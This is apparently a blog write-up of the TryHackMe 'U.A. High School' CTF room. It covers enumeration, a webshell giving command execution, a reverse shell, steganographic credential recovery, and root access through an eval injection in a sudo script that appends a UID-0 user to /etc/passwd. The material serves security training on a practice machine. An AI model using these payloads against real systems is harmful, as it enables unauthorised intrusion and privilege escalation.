---
title: U.A. High School
date: 2025-01-02
categories: [TryHackMe, CTF]
tags: [tryhackme, ctf, web, script, gobuster, webshell, steg, unsanitized_input]     # TAG names should always be lowercase
comments: false
image: /assets/img/tryhackme/ctf/uahighschool/banner.png
---

> [Join us in the mission](https://tryhackme.com/r/room/yueiua) to protect the digital world of superheroes! U.A., the most renowned Superhero Academy, is looking for a superhero to test the security of our new site.
>
> Our site is a reflection of our school values, designed by our engineers with incredible Quirks. We have gone to great lengths to create a secure platform that reflects the exceptional education of the U.A.


We start this challenge by an nmap scan for a little bit of reconnaissance :

```shell
$ nmap -sS -sV -p- 10.10.240.45
Starting Nmap 7.93 ( https://nmap.org ) at 2024-12-30 21:19 CET
Nmap scan report for 10.10.240.45
Host is up (0.032s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.09 seconds
```

And we see (and expected), there is a **web application** running on port `80`, so let’s open our browser to take a first look.

Here is what we find as a landing page :

![1](/assets/img/tryhackme/ctf/uahighschool/1.png)

All the different tabs are not necessarily interesting (and the directory enumeration using **Gobuster** is not helpful at first), the only one that seems to be worth our attention is the “Contact Us” tab which contains a feedback form.

![2](/assets/img/tryhackme/ctf/uahighschool/2.png)

But apparently (after some tries and searches), there is nothing much I can do with that either…

So I guess that we are back to enumerating for more possibilities, and by enumerating we first see that there is a `assets/` directory (which seems normal at first), but I also try to enumerate it to see if I could be lucky :

```shell
$ gobuster dir -u http://10.10.240.45/assets/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -x php,txt,js,html -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.240.45/assets/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              js,html,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess.txt        (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htaccess.js         (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htpasswd.html       (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.htpasswd.js         (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess.html       (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/images               (Status: 301) [Size: 320] [--> http://10.10.240.45/assets/images/]
/index.php            (Status: 200) [Size: 0]
Progress: 102380 / 102385 (100.00%)
===============================================================
Finished
===============================================================
```

In this output, this `index.php` catches our eye! But it is apparently “blank” ?

So indeed, after going to the page, I find a blank page :

![3](/assets/img/tryhackme/ctf/uahighschool/3.png)

I decided to try a few possible payloads to enumerate any query parameters until something worked :

```shell
$ curl -v http://10.10.240.45/assets/index.php?test=1 #Nothing
$ curl -v http://10.10.240.45/assets/index.php?id=1 #Nothing
$ curl -v http://10.10.240.45/assets/index.php?page=about #Nothing
$ curl -v http://10.10.240.45/assets/index.php?file=flag.txt #Nothing

# But when I checked for the possibility of Remote Code Execution...
$ curl -v http://10.10.240.45/assets/index.php?cmd=ls
GET /assets/index.php?cmd=ls HTTP/1.1
> Host: 10.10.240.45
> User-Agent: curl/7.88.1
> Accept: */*
>
< HTTP/1.1 200 OK
< Date: Mon, 30 Dec 2024 22:12:02 GMT
< Server: Apache/2.4.41 (Ubuntu)
< Set-Cookie: PHPSESSID=46tuvhlab0lh9rh6hoqm84ms1c; path=/
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< Content-Length: 40
< Content-Type: text/html; charset=UTF-8
<
* Connection #0 to host 10.10.240.45 left intact
aW1hZ2VzCmluZGV4LnBocApzdHlsZXMuY3NzCg==#
```

While checking for **RCE** (with the `ls` command), I’m surprised to see that it actually works and returns an output encoded in base64. When decoded, it shows the actual output :

```shell
images
index.php
styles.css
```

Using this method, we know that we use this webshell under the `www-data` user and find the first flag in the `/home/deku` folder.

But first, we can try to get a reverse shell for better convenience ? 

This is what we directly do by using [revshells.com](https://www.revshells.com/), then [upgrading it](https://0xffsec.com/handbook/shells/full-tty/) and now we are ready to work :

```shell
$ rlwrap nc -lvnp 1337
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.240.45.
Ncat: Connection from 10.10.240.45:37146.
```

![4](/assets/img/tryhackme/ctf/uahighschool/4.png)

 However, we cannot open the `user.txt` file because only the `deku` user can read it so we need to find a way to upgrade our privileges.

 After a few searches, we notice that there is a directory called `Hidden_Content` in `/var/www`.

![5](/assets/img/tryhackme/ctf/uahighschool/5.png)

 By looking at what is inside this folder, we discover a file named `passphrase.txt` which contains exactly what you think about (**some passphrase encoded in base64**).

 ```shell
$ base64 -d passphrase.txt
All[REDACTED]!!!
 ```

 So, that’s cool but what do we do with it ?

 As well as the `index.php` file that we used to get a foothold on the machine, there is a `/images` directory in the `/assets`. One called `yuei.jpg` (used as background image for the website) and another one called `oneforall.jpg` that seems to be…nothing.

 If I create a **python server** (`python3 -m http.server`) on the machine to extract that oneforall file to my attacker machine (`wget http://<IP>:8000/oneforall.jpg`) and it seems (by using **xxd**) that this file has a **PNG signature** (`89 50 4E 47 0D 0A 1A 0A`) even tho there is **JPEG-specific data** coming right after (`FF DB`). So we can conclude that this file is **corrupted** by this fake signature.

 ```shell
$ xxd oneforall.jpg
00000000: 8950 4e47 0d0a 1a0a 0000 0001 0100 0001  .PNG............
00000010: 0001 0000 ffdb 0043 0006 0405 0605 0406  .......C........
00000020: 0605 0607 0706 080a 100a 0a09 090a 140e  ................
00000030: 0f0c 1017 1418 1817 1416 161a 1d25 1f1a  .............%..
00000040: 1b23 1c16 1620 2c20 2326 2729 2a29 191f  .#... , #&')*)..
00000050: 2d30 2d28 3025 2829 28ff db00 4301 0707  -0-(0%()(...C...
00000060: 070a 080a 130a 0a13 281a 161a 2828 2828  ........(...((((
00000070: 2828 2828 2828 2828 2828 2828 2828 2828  ((((((((((((((((
00000080: 2828 2828 2828 2828 2828 2828 2828 2828  ((((((((((((((((
00000090: 2828 2828 2828 2828 2828 2828 2828 ffc0  ((((((((((((((..
000000a0: 0011 0802 3a04 7403 0122 0002 1101 0311  ....:.t.."......
000000b0: 01ff c400 1f00 0001 0501 0101 0101 0100  ................
000000c0: 0000 0000 0000 0001 0203 0405 0607 0809  ................
000000d0: 0a0b ffc4 00b5 1000 0201 0303 0204 0305  ................
000000e0: 0504 0400 0001 7d01 0203 0004 1105 1221  ......}........!
000000f0: 3141 0613 5161 0722 7114 3281 91a1 0823  1A..Qa."q.2....#
00000100: 42b1 c115 52d1 f024 3362 7282 090a 1617  B...R..$3br.....

[...]
 ```

Hence, we will change that signature using xxd and nano to recover the file :

```shell
$ xxd oneforall.jpg > oneforall.hex

$ nano oneforall.hex
#Changing 8950 4e47 0d0a 1a0a to ffd8
$ xxd -r oneforall.hex > repaired.jpg
```

After that, we can check if we can open the image and this works !

 ![6](/assets/img/tryhackme/ctf/uahighschool/6.png)

 Then, this means we can **steghide** it to test our found passphrase and possibly extract interesting information :

 ```shell
$ steghide extract -sf
 repaired.jpg
Enter passphrase:
Corrupt JPEG data: 18 extraneous bytes before marker 0xdb
wrote extracted data to "creds.txt".
 ```

 And by displaying `creds.txt`, we finally get some **credentials** for the `deku` account :

```shell
$ cat creds.txt
Hi Deku, this is the only way I've found to give you your account credentials, as soon as you have them, delete this file:

deku:On[REDACTED]A
```

We use this to connect through **SSH** (`ssh deku@<IP>`) and we get an access as `deku` !

![7](/assets/img/tryhackme/ctf/uahighschool/7.png)

With this done, we can easily retrieve the first flag :

![8](/assets/img/tryhackme/ctf/uahighschool/8.png)

Well, after searching a little bit more in the popular directories, we can find a folder named `NewComponent` in `/opt` which contains a script named `feedback.sh` created by `deku`. Also, the `sudo -l` command proves that we have rights to run this script as **any user (like root)** using sudo :

```shell
$ sudo -l
[sudo] password for deku:
Matching Defaults entries for deku on myheroacademia:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User deku may run the following commands on myheroacademia:
    (ALL) /opt/NewComponent/feedback.sh
```

So here is the script :

```shell
#!/bin/bash

echo "Hello, Welcome to the Report Form       "
echo "This is a way to report various problems"
echo "    Developed by                        "
echo "        The Technical Department of U.A."

echo "Enter your feedback:"
read feedback


if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
    echo "It is This:"
    eval "echo $feedback"

    echo "$feedback" >> /var/log/feedback.txt
    echo "Feedback successfully saved."
else
    echo "Invalid input. Please provide a valid input."
fi
```

When we look at this script, we can see that it’s **filtering** certain characters like ```, `)`, `$(`, `|`, `&`, `;`, `?`, `!`, `\`, and then it is using the **eval** function to echo the feedback set as input when we launch the script.

Looking at this special line, we can easily see that we could **write in any file as root** using this script.

If we put `text > /home/deku/test.txt` then the whole line will look like :

```shell
echo text > /home/deku/test.txt
```

So it writes the string `text` in the file located in the home folder of deku, `test.txt`.

![9](/assets/img/tryhackme/ctf/uahighschool/9.png)

Using this vulnerability, we could write a **new user entry** in `/etc/passwd` with **root** privileges.

First, we create a new hashed password using **openssl** command, I set it as `root`.

```shell
$ openssl passwd -6
Password:
Verifying - Password:
$6$LzGlf10v8QfV4Ush$Svictmz8nB3EXhM3E9QDP.jjVW99TqXRDDUR9YSkP.SD4q/2yYAF2zQot5ZonF0pncGSLeJ5K3/74hTRp.Vyo1
```

Then, we append this entry in the `/etc/passwd` with a new user called `nuser` with the UID and GID at `0` (so root).

```shell
nuser:$6$LzGlf10v8QfV4Ush$Svictmz8nB3EXhM3E9QDP.jjVW99TqXRDDUR9YSkP.SD4q/2yYAF2zQot5ZonF0pncGSLeJ5K3/74hTRp.Vyo1:0:0:New User:/home/nuser:/bin/bash
```

We launch the script and enter our specific entry :
```shell
$ sudo ./feedback.sh
Hello, Welcome to the Report Form
This is a way to report various problems
    Developed by
        The Technical Department of U.A.
Enter your feedback:
'nuser:$6$LzGlf10v8QfV4Ush$Svictmz8nB3EXhM3E9QDP.jjVW99TqXRDDUR9YSkP.SD4q/2yYAF2zQot5ZonF0pncGSLeJ5K3/74hTRp.Vyo1:0:0:New User:/home/nuser:/bin/bash' >> /etc/passwd
It is This:
Feedback successfully saved.
```

```shell
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
[....]
nuser:$6$LzGlf10v8QfV4Ush$Svictmz8nB3EXhM3E9QDP.jjVW99TqXRDDUR9YSkP.SD4q/2yYAF2zQot5ZonF0pncGSLeJ5K3/74hTRp.Vyo1:0:0:New User:/home/nuser:/bin/bash
```

Now we can switch to that user (with `su - nuser`) and retrieve the root flag :

![10](/assets/img/tryhackme/ctf/uahighschool/10.png)